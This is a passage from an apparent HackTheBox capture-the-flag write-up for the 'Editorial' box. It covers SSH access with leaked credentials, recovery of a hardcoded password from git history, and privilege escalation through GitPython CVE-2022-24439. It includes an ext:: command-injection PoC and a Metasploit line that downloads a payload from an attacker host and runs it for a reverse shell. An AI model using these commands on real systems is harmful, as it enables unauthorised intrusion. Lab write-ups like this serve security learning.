</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;12/02/2024&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;frEsh11bookS230&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;31/11/2023&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><h3 id="foothold">Foothold</h3>
<p>I used the credential from the authors to try to SSH into the box and it worked.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>dev:dev080217_devAPI!@
</span></span></code></pre></div><p><img src="images/20240618083237.png" alt="alt text"></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>After, successfully getting <code>dev</code>&rsquo;s SSH shell. Let&rsquo;s enumerate the target using LinPEAS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span>I found a vulnerable version of <span style="color:#ff79c6">`</span>screen v4.<span style="color:#bd93f9">09</span>.<span style="color:#bd93f9">00</span><span style="color:#ff79c6">`</span> but the [exploit](https:<span style="color:#ff79c6">//</span>www.exploit<span style="color:#ff79c6">-</span>db.com<span style="color:#ff79c6">/</span>exploits<span style="color:#ff79c6">/</span><span style="color:#bd93f9">51252</span>) didn<span style="color:#f1fa8c">&#39;t work. To exploit this we needed the `screen` to have setuid bit set by root.
</span></span></span></code></pre></div><p><strong>Users that exist on the box.</strong>
<img src="images/20240618180158.png" alt="alt text"></p>
<p><strong>Found a git initialized directory.</strong>
<img src="images/20240618174809.png" alt="alt text"></p>
<p>After enumerating the <code>apps</code> folder with <code>git</code> I found some interesting commits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git log
</span></span><span style="display:flex;"><span>commit 8ad0f3187e2bda88bba85074635ea942974587e8 <span style="color:#ff79c6">(</span>HEAD -&gt; master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:04:21 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fix: bugfix in api port endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit dfef9f20e57d730b7d71967582035925d57ad883
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:01:11 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    change: remove debug and update api port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:55:08 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    change<span style="color:#ff79c6">(</span>api<span style="color:#ff79c6">)</span>: downgrading prod to dev
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * To use development environment.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 1e84a036b2f33c59e2390730699a488c65643d28
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:51:10 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    feat: create api to editorial info
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * It <span style="color:#ff79c6">(</span>will<span style="color:#ff79c6">)</span> contains internal info about the editorial, this <span style="color:#8be9fd;font-style:italic">enable</span>
</span></span><span style="display:flex;"><span>       faster access to information.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:48:43 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    feat: create editorial app
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * This contains the base of this project.
</span></span><span style="display:flex;"><span>    * Also we add a feature to <span style="color:#8be9fd;font-style:italic">enable</span> to external authors send us their
</span></span><span style="display:flex;"><span>       books and validate a future post in our editorial.
</span></span></code></pre></div><p>The commit before <code>change(api): downgrading prod to dev</code> looks very interesting, It says <code>It (will) contains internal info about the editorial, this enable faster access to information.</code> Let&rsquo;s checkout the commit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ git checkout 1e84a036b2f33c59e2390730699a488c65643d28
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/login-background.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-janko-ferlic-590493.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-min-an-694740.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/templates/about.html
</span></span><span style="display:flex;"><span>D	app_editorial/templates/index.html
</span></span><span style="display:flex;"><span>D	app_editorial/templates/upload.html
</span></span><span style="display:flex;"><span>Note: switching to <span style="color:#f1fa8c">&#39;1e84a036b2f33c59e2390730699a488c65643d28&#39;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You are in <span style="color:#f1fa8c">&#39;detached HEAD&#39;</span> state. You can look around, make experimental
</span></span><span style="display:flex;"><span>changes and commit them, and you can discard any commits you make in this
</span></span><span style="display:flex;"><span>state without impacting any branches by switching back to a branch.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If you want to create a new branch to retain commits you create, you may
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">do</span> so <span style="color:#ff79c6">(</span>now or later<span style="color:#ff79c6">)</span> by using -c with the switch command. Example:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  git switch -c &lt;new-branch-name&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Or undo this operation with:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  git switch -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Turn off this advice by setting config variable advice.detachedHead to <span style="color:#8be9fd;font-style:italic">false</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HEAD is now at 1e84a03 feat: create api to editorial info
</span></span></code></pre></div><p>After, checking out that commit I found two folders <code>app_api</code> and <code>app_editorial</code>. The <code>app_api</code> was the app that leaked the credential for <code>dev</code> user and gave us foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ ls
</span></span><span style="display:flex;"><span>app_api  app_editorial
</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_
</span></span><span style="display:flex;"><span>-bash: cd: app_: No such file or directory
</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_api/
</span></span><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ ls
</span></span><span style="display:flex;"><span>app.py
</span></span></code></pre></div><p>Let&rsquo;s see what&rsquo;s inside the <code>app.py</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ cat app.py 
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API (in development).</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># * To retrieve info about editorial</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import json
</span></span><span style="display:flex;"><span>from flask import Flask, jsonify
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># App configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">app</span> <span style="color:#ff79c6">=</span> Flask<span style="color:#ff79c6">(</span>__name__<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Global Variables</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_route</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_name</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_email</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;info@tiempoarriba.htb&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API routes</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : home</span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/api&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
</span></span><span style="display:flex;"><span>def index<span style="color:#ff79c6">()</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">data_editorial</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;version&#39;</span>: <span style="color:#ff79c6">[{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Editorial El Tiempo Por Arriba&#39;</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.1&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Ed Tiempo Arriba&#39;</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1.1/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.2&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v1.2/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.moc.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v2/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2.3&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: api_editorial_email,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;{api_route}/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">(</span>data_editorial<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : (development) mail message to new authors</span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span>api_route + <span style="color:#f1fa8c">&#39;/authors/message&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
</span></span><span style="display:flex;"><span>def api_mail_new_authors<span style="color:#ff79c6">()</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">({</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;template_mail_message&#39;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34;</span> + api_editorial_name + <span style="color:#f1fa8c">&#34; Team.&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">})</span> <span style="color:#6272a4"># TODO: replace dev credentials when checks pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Start program</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app.run<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">host</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#8be9fd;font-style:italic">port</span><span style="color:#ff79c6">=</span>5001, <span style="color:#8be9fd;font-style:italic">debug</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>Looks like the we credentials for <code>prod</code> user. Let&rsquo;s try to SSH into the box as <code>prod</code> with the following credential.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>prod:080217_Producti0n_2023!@
</span></span></code></pre></div><p>Successfully logged in as <code>prod</code>.
<img src="images/20240618181004.png" alt="alt text"></p>
<p>The user <code>prod</code> can run only the following script as sudo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> prod: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> prod on editorial:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User prod may run the following commands on editorial:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
</span></span></code></pre></div><p>Let&rsquo;s see what the script looks like.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>import sys
</span></span><span style="display:flex;"><span>from git import Repo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>os.chdir<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/opt/internal_apps/clone_changes&#39;</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">url_to_clone</span> <span style="color:#ff79c6">=</span> sys.argv<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">r</span> <span style="color:#ff79c6">=</span> Repo.init<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#8be9fd;font-style:italic">bare</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>r.clone_from<span style="color:#ff79c6">(</span>url_to_clone, <span style="color:#f1fa8c">&#39;new_changes&#39;</span>, <span style="color:#8be9fd;font-style:italic">multi_options</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span><span style="color:#ff79c6">])</span>
</span></span></code></pre></div><p>The script is cloning a repository from a remote URL. And it&rsquo;s using a git library. Let&rsquo;s see which python package is that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ pip3 list | grep -i git
</span></span><span style="display:flex;"><span>gitdb                 4.0.10
</span></span><span style="display:flex;"><span>GitPython             3.1.29
</span></span></code></pre></div><p><a href="https://www.cve.org/CVERecord?id=CVE-2022-24439"><strong>CVE-2022-24439</strong></a>
According to <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">SNYK</a>: Affected versions( &lt; 3.1.30) of <code>gitpython</code> package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to <code>git</code> without sufficient sanitization of input arguments. This is only relevant when enabling the <code>ext</code> transport protocol.</p>
<p><strong>PoC:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> git <span style="color:#ff79c6">import</span> Repo
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> Repo<span style="color:#ff79c6">.</span>init(<span style="color:#f1fa8c">&#39;&#39;</span>, bare<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>clone_from(<span style="color:#f1fa8c">&#39;ext::sh -c touch% /tmp/pwned&#39;</span>, <span style="color:#f1fa8c">&#39;tmp&#39;</span>, multi_options<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span>])
</span></span></code></pre></div><p>We found our PE vector. To exploit it I used the <code>msfconsole</code>&rsquo;s web delivery module and set payload to <code>linux/x64/shell/reverse_tcp</code>. And I uploaded the payload to the <code>prod</code> user&rsquo;s home directory.</p>
<p>Metasploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 10.10.14.50:4444 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using URL: http://10.10.14.50:8080/DHmVwiq
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Server started.
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
</span></span></code></pre></div><p>Executing the payload using the exploit:</p>
